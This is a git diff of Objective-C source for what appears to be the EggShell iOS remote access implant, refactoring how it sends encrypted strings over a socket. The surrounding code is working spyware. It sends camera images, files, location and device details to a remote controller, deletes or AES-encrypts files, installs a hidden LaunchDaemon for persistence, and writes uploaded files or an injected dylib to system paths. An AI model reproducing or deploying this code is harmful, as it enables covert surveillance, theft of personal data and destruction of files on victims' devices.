@@ -6,7 +6,6 @@ CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable
 @synthesize recorder;
 
 -(id)init {
-    TERM = @"EOF6D2ONE";
     _thisUIDevice = [UIDevice currentDevice];
     [_thisUIDevice setBatteryMonitoringEnabled:YES];
     _fileManager = [[NSFileManager alloc] init];
@@ -38,18 +37,18 @@ int sockfd;
     write (sockfd, prepData, sizeof(data));
 }
 
--(void)sendString:(NSString *)string :(NSString *)key {
+-(void)sendString:(NSString *)string {
     string = [string stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
     NSString *base64String = [[string dataUsingEncoding:NSUTF8StringEncoding] base64EncodedStringWithOptions:0];
     //send string as encrypted base64 string with our generated key from our encrypted argument
-    NSString *finalstr = [FBEncryptorAES encryptBase64String:base64String keyString:key separateLines:false];
-    write (sockfd, [[NSString stringWithFormat:@"%@EOF6D2ONE",finalstr] UTF8String], finalstr.length + 10);
+    NSString *finalstr = [FBEncryptorAES encryptBase64String:base64String keyString:_skey separateLines:false];
+    write (sockfd, [[NSString stringWithFormat:@"%@%@",finalstr,_terminator] UTF8String], finalstr.length + _terminator.length);
 }
 
 //MARK: Convenience
 
 -(void)blank {
-    [self sendString:@"":_skey]; //bang
+    [self sendString:@""]; //bang
 }
 
 -(NSString *)forgetFirst:(NSArray *)args {
@@ -76,7 +75,7 @@ int sockfd;
     [self captureWithBlock:^(NSData *imageData) {
         done = YES;
         printf("image data length = %lu\n",(unsigned long)imageData.length);
-        [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)imageData.length] :_skey];
+        [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)imageData.length]];
         [self sendEncryptedFile:imageData];
     }];
     while (!done)
@@ -171,7 +170,7 @@ int sockfd;
     NSError *error = nil;
     files = [_fileManager contentsOfDirectoryAtPath:dir error:&error];
     if (error != nil) {
-        [self sendString:[NSString stringWithFormat:@"%@",error]:_skey];
+        [self sendString:[NSString stringWithFormat:@"%@",error]];
         return;
     }
     
@@ -182,7 +181,7 @@ int sockfd;
     if ([result length] > 0) {
         result = [result substringToIndex:[result length] - 1];
     }
-    [self sendString:result:_skey];
+    [self sendString:result];
     //[self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)[result length] ]:skey];
 }
 
@@ -192,13 +191,13 @@ int sockfd;
         file = [self forgetFirst:args];
     }
     else {
-        [self sendString:@"Usage: rm filename":_skey];
+        [self sendString:@"Usage: rm filename"];
         return;
     }
     BOOL isdir = false;
     if ([_fileManager fileExistsAtPath:file isDirectory:&isdir]) {
         if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@: is a directory",file]:_skey];
+            [self sendString:[NSString stringWithFormat:@"%@: is a directory",file]];
         }
         else {
             [_fileManager removeItemAtPath:file error:NULL];
@@ -206,7 +205,7 @@ int sockfd;
         }
     }
     else {
-        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",file]:_skey];
+        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",file]];
     }
 }
 
@@ -221,14 +220,14 @@ int sockfd;
         if (isdir) {
             [_fileManager changeCurrentDirectoryPath:dir];
             NSString *blank = @"";
-            [self sendString:[NSString stringWithFormat:blank,dir]:_skey];
+            [self sendString:[NSString stringWithFormat:blank,dir]];
         }
         else {
-            [self sendString:[NSString stringWithFormat:@"%@: Not a directory",dir]:_skey];
+            [self sendString:[NSString stringWithFormat:@"%@: Not a directory",dir]];
         }
     }
     else {
-        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]:_skey];
+        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
     }
 }
 
@@ -275,7 +274,7 @@ int sockfd;
         }
     }
     //our end send file command
-    write(sockfd, [TERM UTF8String], 9);
+    write(sockfd, [_terminator UTF8String], _terminator.length);
 }
 
 -(void)download:(NSArray *)args {
@@ -287,25 +286,20 @@ int sockfd;
         BOOL isdir;
         if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
             if (isdir) {
-                [self sendString:@"-2" : _skey];
+                [self sendString:@"-2"];
             }
             else {
                 NSData *filedata = [_fileManager contentsAtPath:filepath];
-                [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)filedata.length]:_skey];
+                [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)filedata.length]];
                 [self sendEncryptedFile:filedata];
             }
         }
         else {
-            [self sendString:@"-1" : _skey];
+            [self sendString:@"-1"];
         }
     }
 }
 
--(void)upload:(NSArray *)args {
-    @autoreleasepool {
-        
-    }
-}
 
 
 -(void)encryptFile:(NSArray *)args {
@@ -317,24 +311,24 @@ int sockfd;
         filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
     }
     else {
-        [self sendString:@"Usage: encrypt file password1234":_skey];
+        [self sendString:@"Usage: encrypt file password1234"];
         return;
     }
     
     if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
         if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]:_skey];
+            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
         }
         else {
             NSData *filedata = [_fileManager contentsAtPath:filepath];
-            [self sendString:[NSString stringWithFormat:@"Encrypting %@.aes with 256 Bit AES",filepath]:_skey];
+            [self sendString:[NSString stringWithFormat:@"Encrypting %@.aes with 256 Bit AES",filepath]];
             filedata = [filedata AES256EncryptWithKey:args[args.count -1]];
             [filedata writeToFile:[NSString stringWithFormat:@"%@.aes",filepath] atomically:true];
             [_fileManager removeItemAtPath:filepath error:nil];
         }
     }
     else {
-        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]:_skey];
+        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
     }
 }
 
@@ -347,65 +341,30 @@ int sockfd;
         filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
     }
     else {
-        [self sendString:@"Usage: decrypt file.aes password1234":_skey];
+        [self sendString:@"Usage: decrypt file.aes password1234"];
         return;
     }
     
     if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
         if (isdir) {
-            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]:_skey];
+            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
         }
         else {
             if ([filepath containsString:@".aes"]) {
                 NSData *filedata = [_fileManager contentsAtPath:filepath];
-                [self sendString:[NSString stringWithFormat:@"Decrypting %@",filepath]:_skey];
+                [self sendString:[NSString stringWithFormat:@"Decrypting %@",filepath]];
                 filedata = [filedata AES256DecryptWithKey:args[args.count -1]];
                 [filedata writeToFile:[filepath substringToIndex:[filepath length] - 4] atomically:true];
                 [_fileManager removeItemAtPath:filepath error:nil];
                 
             }
             else {
-                [self sendString:[NSString stringWithFormat:@"Only supports .aes files"]:_skey];
+                [self sendString:[NSString stringWithFormat:@"Only supports .aes files"]];
             }
         }
     }
     else {
-        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]:_skey];
-    }
-}
-
--(void)receiveDYLIB {
-    NSString *fileData = @"";
-    int bsize = 1024;
-    char buffer[bsize];
-    while (true) {
-        //read data from socket
-        read (sockfd, &buffer, sizeof(buffer));
-        //append b64 data to string
-        long buflen = strlen(buffer);
-        if (buflen < bsize) {
-            bsize = buflen;
-        }
-        fileData = [NSString stringWithFormat:@"%@%@",fileData,[[NSString stringWithFormat:@"%s",buffer] substringToIndex:bsize]];
-        //Check if we are done or not
-        if (strstr(buffer,[TERM UTF8String])) {
-            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-                HBLogDebug(@"Terminator Found!");
-            });
-            fileData = [fileData stringByReplacingOccurrencesOfString:TERM withString:@""];
-            NSData *rawdata = [[NSData alloc] initWithBase64EncodedString:fileData options: NSDataBase64DecodingIgnoreUnknownCharacters];
-            [rawdata writeToFile:@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib" atomically:true];
-            [self blank];
-            [self exec:@"killall SpringBoard"];
-            return;
-        }
-        else {
-            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-                HBLogDebug(@"terminator not found!");
-            });
-        }
-        //clear the received data
-        memset(buffer,'\0',1024);
+        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
     }
 }
 
@@ -425,7 +384,7 @@ int sockfd;
         result = @"Unable to get Coordinates\nAre location services enabled?";
     }
     [manager release];
-    [self sendString:result:_skey];
+    [self sendString:result];
 }
 
 -(void)exec:(NSString *)command {
@@ -438,6 +397,29 @@ int sockfd;
 -(void)vibrate {
     AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
     [self blank];
+}
+
+-(void)sysinfo {
+    uint64_t totalSpace = 0;
+    uint64_t totalFreeSpace = 0;
+    NSError *error = nil;
+    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+    NSDictionary *dictionary = [[NSFileManager defaultManager] attributesOfFileSystemForPath:[paths lastObject] error: &error];
+    
+    if (dictionary) {
+        NSNumber *fileSystemSizeInBytes = [dictionary objectForKey: NSFileSystemSize];
+        NSNumber *freeFileSystemSizeInBytes = [dictionary objectForKey:NSFileSystemFreeSize];
+        totalSpace = [fileSystemSizeInBytes unsignedLongLongValue];
+        totalFreeSpace = [freeFileSystemSizeInBytes unsignedLongLongValue];
+    }
+
+    NSString *info = [NSString stringWithFormat:@"Model: %@\nSystem Version: %@ %@\nDevice Name: %@\nUUID: %@\n%@",
+                      [_thisUIDevice model],
+                      [_thisUIDevice systemName],[_thisUIDevice systemVersion],
+                      [_thisUIDevice name],
+                      [_thisUIDevice identifierForVendor],
+                      [self battery]];
+    [self sendString:info];
 }
 
 -(void)say:(NSString *)string {
@@ -476,25 +458,25 @@ int sockfd;
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         [self displayalert:[titlestring UTF8String]:[messagestring UTF8String]];
     });
-    [self sendString:@"":_skey];
+    [self sendString:@""];
 }
 
 -(void)getPid {
     NSProcessInfo *processInfo = [NSProcessInfo processInfo];
     int processID = [processInfo processIdentifier];
-    [self sendString:[NSString stringWithFormat:@"%d",processID]:_skey];
+    [self sendString:[NSString stringWithFormat:@"%d",processID]];
 }
 
 -(void)openURL:(NSArray *)args {
     if ([args count] > 1) {
         CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[args[1] UTF8String], strlen([args[1] UTF8String]), kCFStringEncodingUTF8, NULL);
         if(!cu) {
-            [self sendString:@"Invalid URL":_skey];
+            [self sendString:@"Invalid URL"];
         }
         else {
             bool ret = SBSOpenSensitiveURLAndUnlock(cu, 1);
             if (!ret) {
-                [self sendString:[NSString stringWithFormat:@"Error opening url %@",args[1]]:_skey];
+                [self sendString:[NSString stringWithFormat:@"Error opening url %@",args[1]]];
             }
             else {
                 [self blank];
@@ -502,7 +484,7 @@ int sockfd;
         }
     }
     else {
-        [self sendString:@"Usage example: openurl http://google.com":_skey];
+        [self sendString:@"Usage example: openurl http://google.com"];
     }
 }
     
@@ -511,7 +493,7 @@ int sockfd;
         [self openURL:[NSArray arrayWithObjects:@"", [NSString stringWithFormat:@"tel://%@",args[1]], nil]];
     }
     else {
-        [self sendString:@"Usage example: dial 5553334444":_skey];
+        [self sendString:@"Usage example: dial 5553334444"];
     }
 }
 
@@ -524,14 +506,14 @@ int sockfd;
         [self blank];
     }
     else {
-        [self sendString:@"Usage example: volume 0.1":_skey];
+        [self sendString:@"Usage example: volume 0.1"];
     }
 }
 
 -(void)getVolume {
     #pragma GCC diagnostic push
     #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
-    [self sendString:[NSString stringWithFormat:@"%.2f",[[MPMusicPlayerController applicationMusicPlayer]volume]]:_skey];
+    [self sendString:[NSString stringWithFormat:@"%.2f",[[MPMusicPlayerController applicationMusicPlayer]volume]]];
     #pragma GCC diagnostic pop
 }
 
@@ -548,10 +530,10 @@ int sockfd;
         NSString * album   = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
         NSString * artist  = [song valueForProperty:MPMediaItemPropertyArtist];
         NSString *mpstatus = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f",title,album,artist,newcurrentpbt];
-        [self sendString:mpstatus:_skey];
+        [self sendString:mpstatus];
     }
     else {
-        [self sendString:@"Not Playing":_skey];
+        [self sendString:@"Not Playing"];
     }
     #pragma GCC diagnostic pop
 }
@@ -566,17 +548,16 @@ int sockfd;
                 apps = [NSString stringWithFormat:@"%@%@\n",apps,CFArrayGetValueAtIndex(ary, i)];
             }
         }
-        [self sendString:apps:_skey];
+        [self sendString:apps];
     }
     else {
-        [self sendString:@"could not SBSCopyApplicationDisplayIdentifiers":_skey];
+        [self sendString:@"could not SBSCopyApplicationDisplayIdentifiers"];
     }
 }
 
--(void)battery {
+-(NSString *)battery {
     int batinfo=([_thisUIDevice batteryLevel]*100);
-    NSString *batlevel = [NSString stringWithFormat:@"Battery Level: %d ",batinfo];
-    [self sendString:batlevel:_skey];
+    return [NSString stringWithFormat:@"Battery Level: %d ",batinfo];
 }
 
 -(void)launchApp:(NSArray *)args {
@@ -588,7 +569,7 @@ int sockfd;
         ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
         
         if (ret != 0) {
-            [self sendString:@"Cannot open app, is device locked?":_skey];
+            [self sendString:@"Cannot open app, is device locked?"];
             return;
         }
         
@@ -596,14 +577,14 @@ int sockfd;
         [self blank];
     }
     else {
-        [self sendString:@"Usage: open BundleIdentifier":_skey];
+        [self sendString:@"Usage: open BundleIdentifier"];
     }
 }
 
 -(void)persistence:(NSString *)ip :(int)port {
     NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
     if ([_fileManager fileExistsAtPath:loaderpath]) {
-        [self sendString:@"Persistence already installed":_skey];
+        [self sendString:@"Persistence already installed"];
     }
     else {
         NSString *plist = [NSString stringWithFormat:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
@@ -621,7 +602,7 @@ int sockfd;
                   encoding:NSUTF8StringEncoding
                      error:nil];
         [self exec:[NSString stringWithFormat:@"launchctl load %@",loaderpath]];
-        [self sendString:@"Persistence Installed":_skey];
+        [self sendString:@"Persistence Installed"];
     }
 }
 -(void)rmpersistence {
@@ -629,29 +610,49 @@ int sockfd;
     if ([_fileManager fileExistsAtPath:loaderpath]) {
         [self exec:[NSString stringWithFormat:@"launchctl unload %@",loaderpath]];
         [_fileManager removeItemAtPath:loaderpath error:NULL];
-        [self sendString:@"Persistence removed":_skey];
+        [self sendString:@"Persistence removed"];
     }
     else {
-        [self sendString:@"Persistence not installed":_skey];
+        [self sendString:@"Persistence not installed"];
     }
 }
 
 //MARK: EggShell Pro
 
--(void)mcSendNoReply:(NSString *)message {
-    if ([_messagingCenter sendMessageName:message userInfo:nil]) {
+-(void)upload:(int)size :(NSString *)uploadpath {
+    long dinc = 0;
+    NSString *filedata = @"";
+    while(1) {
+        char buffer[1024];
+        read(sockfd, &buffer, sizeof(buffer));
+        filedata = [NSString stringWithFormat:@"%@%s",filedata,buffer];
+        dinc += 1024;
+        memset(buffer,'\0',1024);
+        if (strstr([filedata UTF8String],[_terminator UTF8String])) {
+            filedata = [filedata stringByReplacingOccurrencesOfString:_terminator withString:@""];
+            break;
+        }
+    }
+    NSData *fdata = [[NSData alloc] initWithBase64EncodedString:filedata options:NSDataBase64DecodingIgnoreUnknownCharacters];
+    [fdata writeToFile:uploadpath atomically:true];
+}
+
+-(void)mcSendNoReply:(NSString *)command {
+    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
+    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo]) {
         [self blank];
     }
     else {
-        [self sendString:@"You dont have eggshellPro Extension":_skey];
+        [self sendString:@"You dont have eggshellPro Extension"];
     }
 }
 
 
--(void)mcSendYesReply:(NSString *)message {
-    NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:message userInfo:nil];
+-(void)mcSendYesReply:(NSString *)command {
+    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
+    NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply" userInfo:userInfo];
     NSString *replystr = [reply objectForKey:@"returnStatus"];
-    [self sendString:replystr:_skey];
+    [self sendString:replystr];
 }
 
 -(void)locationService:(NSArray *)args {
@@ -664,11 +665,11 @@ int sockfd;
             [self mcSendNoReply:@"locationoff"];
         }
         else {
-            [self sendString:howto:_skey];
+            [self sendString:howto];
         }
     }
     else {
-        [self sendString:howto:_skey];
+        [self sendString:howto];
     }
 }
 
